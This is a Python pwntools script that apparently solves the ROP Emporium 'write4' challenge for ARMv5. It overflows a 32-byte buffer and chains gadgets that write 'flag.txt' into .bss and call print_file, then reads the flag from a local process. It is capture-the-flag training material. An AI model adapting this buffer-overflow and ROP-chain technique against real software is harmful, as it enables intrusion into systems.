from pwn import *

elf = ELF("write4_armv5-hf")

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme+0xb0
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BUFFER_SIZE = 32
READ_SIZE = 512

PATH = b'flag.txt'
MEMORY = elf.bss(0x800)

STR_POP_R3_R4_PC_GADGET = elf.symbols.usefulGadgets # str r3, [r4]; pop {r3, r4, pc}
POP_R3_R4_PC_GADGET = elf.symbols.usefulGadgets + 0x4 # pop {r3, r4, pc}
POP_R0_PC_GADGET = elf.symbols.usefulGadgets + 0x8 # pop {r0, pc}

def main():
    rop = ROP(elf)
    rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
    # write file name to memory (in 2 halves)
    rop.raw([POP_R3_R4_PC_GADGET, PATH[:context.bytes], MEMORY, STR_POP_R3_R4_PC_GADGET])
    rop.raw([PATH[context.bytes:], MEMORY + context.bytes, STR_POP_R3_R4_PC_GADGET])
    # call target function with file name as arg
    rop.raw([0, 0, POP_R0_PC_GADGET, MEMORY, elf.symbols.print_file])
    payload = rop.chain()
    assert len(payload) <= READ_SIZE

    c = connection()
    c.sendafter(b'> ', payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
